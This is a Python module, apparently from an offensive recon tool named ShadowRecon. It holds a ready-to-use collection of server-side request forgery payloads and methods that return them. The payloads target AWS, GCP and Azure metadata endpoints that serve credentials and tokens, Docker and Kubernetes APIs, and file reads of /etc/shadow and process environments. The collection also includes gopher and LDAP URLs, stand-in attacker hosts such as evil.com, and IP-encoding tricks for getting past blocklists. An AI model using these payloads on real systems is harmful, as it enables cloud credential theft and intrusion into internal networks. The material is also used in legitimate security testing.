"""
Advanced SSRF Payloads for ShadowRecon v1.0
Developed by kernelpanic | A product of infosbios

Comprehensive Server-Side Request Forgery payload collection
"""

class SSRFPayloads:
    """Advanced SSRF payload collection"""

    # Cloud metadata endpoints
    AWS_METADATA = [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/meta-data/instance-id',
        'http://169.254.169.254/latest/meta-data/local-ipv4',
        'http://169.254.169.254/latest/meta-data/public-ipv4',
        'http://169.254.169.254/latest/meta-data/hostname',
        'http://169.254.169.254/latest/user-data',
        'http://169.254.169.254/latest/dynamic/instance-identity/document',
        'http://169.254.169.254:80/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/network/interfaces/macs/',
    ]

    # Google Cloud metadata
    GOOGLE_METADATA = [
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/',
        'http://metadata.google.internal/computeMetadata/v1/project/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://metadata.google.internal/computeMetadata/v1/instance/attributes/',
        'http://metadata.google.internal/computeMetadata/v1/instance/hostname',
        'http://metadata.google.internal/computeMetadata/v1/instance/id',
        'http://metadata/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/',
    ]

    # Azure metadata
    AZURE_METADATA = [
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/tags?api-version=2021-02-01',
        'http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01',
    ]

    # Docker metadata
    DOCKER_METADATA = [
        'http://172.17.0.1:2375/info',
        'http://172.17.0.1:2376/info',
        'http://127.0.0.1:2375/info',
        'http://127.0.0.1:2376/info',
        'http://unix:/var/run/docker.sock/info',
        'http://172.17.0.1:2375/containers/json',
        'http://172.17.0.1:2375/images/json',
        'http://172.17.0.1:2375/version',
    ]

    # Kubernetes metadata
    KUBERNETES_METADATA = [
        'https://kubernetes.default.svc.cluster.local/api',
        'https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods',
        'http://127.0.0.1:10255/stats/summary',
        'http://127.0.0.1:10255/pods',
        'http://127.0.0.1:8080/api',
        'http://127.0.0.1:8080/api/v1',
        'http://kubernetes.default.svc/api/v1/secrets',
    ]

    # Internal network scanning
    INTERNAL_SCANNING = [
        'http://127.0.0.1:22/',
        'http://127.0.0.1:80/',
        'http://127.0.0.1:8080/',
        'http://127.0.0.1:443/',
        'http://127.0.0.1:3306/',
        'http://127.0.0.1:5432/',
        'http://127.0.0.1:6379/',
        'http://127.0.0.1:27017/',
        'http://localhost:22/',
        'http://localhost:80/',
        'http://localhost:3000/',
        'http://localhost:8000/',
        'http://localhost:9000/',
        'http://192.168.1.1/',
        'http://10.0.0.1/',
        'http://172.16.0.1/',
    ]

    # File protocol payloads
    FILE_PROTOCOL = [
        'file:///etc/passwd',
        'file:///etc/shadow',
        'file:///etc/hosts',
        'file:///proc/version',
        'file:///proc/self/environ',
        'file://C:/windows/system32/drivers/etc/hosts',
        'file://C:/windows/win.ini',
        'file:///C:/windows/system32/drivers/etc/hosts',
        'file:///var/log/apache2/access.log',
        'file:///var/log/nginx/access.log',
    ]

    # LDAP injection
    LDAP_PAYLOADS = [
        'ldap://127.0.0.1:389/',
        'ldap://localhost:389/',
        'ldaps://127.0.0.1:636/',
        'ldap://127.0.0.1:389/dc=example,dc=com',
        'ldap://attacker.com:389/',
    ]

    # Gopher protocol (advanced)
    GOPHER_PAYLOADS = [
        'gopher://127.0.0.1:22/_',
        'gopher://127.0.0.1:25/_',
        'gopher://127.0.0.1:3306/_',
        'gopher://127.0.0.1:6379/_',
        'gopher://127.0.0.1:9200/_',
        'gopher://localhost:22/_',
        'gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a',
    ]

    # DNS rebinding
    DNS_REBINDING = [
        'http://7f000001.xip.io/',
        'http://127.0.0.1.xip.io/',
        'http://localhost.xip.io/',
        'http://spoofed.burpcollaborator.net/',
        'http://localtest.me/',
        'http://vcap.me/',
        'http://lvh.me/',
        'http://127.0.0.1.nip.io/',
        'http://169.254.169.254.xip.io/latest/meta-data/',
    ]

    # Bypassing blacklists
    BLACKLIST_BYPASS = [
        'http://0x7f000001/',
        'http://017700000001/',
        'http://2130706433/',
        'http://127.1/',
        'http://0/',
        'http://[::1]/',
        'http://[::ffff:127.0.0.1]/',
        'http://①②⑦.⓪.⓪.①/',
        'http://127。0。0。1/',
        'http://127\x2e0\x2e0\x2e1/',
        'http://localhost',
        'http://LOCALHOST',
        'http://localHOST',
        'https://127.0.0.1@evil.com/',
        'http://evil.com#127.0.0.1',
        'http://127.0.0.1#@evil.com',
    ]

    # Hex/Octal/Decimal encoding
    ENCODED_ADDRESSES = [
        'http://0x7f.0x0.0x0.0x1/',
        'http://0177.0000.0000.0001/',
        'http://2130706433/',
        'http://017700000001/',
        'http://0x7f000001/',
        'http://3232235521/',  # 192.168.0.1 in decimal
        'http://2886729729/',  # 172.16.0.1 in decimal
        'http://0xa9fea9fe/',  # 169.254.169.254 in hex
    ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Get all SSRF payloads"""
        all_payloads = []
        all_payloads.extend(cls.AWS_METADATA)
        all_payloads.extend(cls.GOOGLE_METADATA)
        all_payloads.extend(cls.AZURE_METADATA)
        all_payloads.extend(cls.DOCKER_METADATA)
        all_payloads.extend(cls.KUBERNETES_METADATA)
        all_payloads.extend(cls.INTERNAL_SCANNING)
        all_payloads.extend(cls.FILE_PROTOCOL)
        all_payloads.extend(cls.LDAP_PAYLOADS)
        all_payloads.extend(cls.GOPHER_PAYLOADS)
        all_payloads.extend(cls.DNS_REBINDING)
        all_payloads.extend(cls.BLACKLIST_BYPASS)
        all_payloads.extend(cls.ENCODED_ADDRESSES)
        return all_payloads

    @classmethod
    def get_cloud_metadata_payloads(cls, cloud_provider: str) -> list:
        """Get cloud-specific metadata payloads"""
        cloud_map = {
            'aws': cls.AWS_METADATA,
            'google': cls.GOOGLE_METADATA,
            'azure': cls.AZURE_METADATA,
            'docker': cls.DOCKER_METADATA,
            'kubernetes': cls.KUBERNETES_METADATA
        }
        return cloud_map.get(cloud_provider.lower(), cls.AWS_METADATA)

    @classmethod
    def generate_port_scan_payloads(cls, target_ip: str = '127.0.0.1') -> list:
        """Generate port scanning payloads for specific IP"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 27017]
        payloads = []

        for port in common_ports:
            payloads.append(f'http://{target_ip}:{port}/')
            payloads.append(f'https://{target_ip}:{port}/')

        return payloads
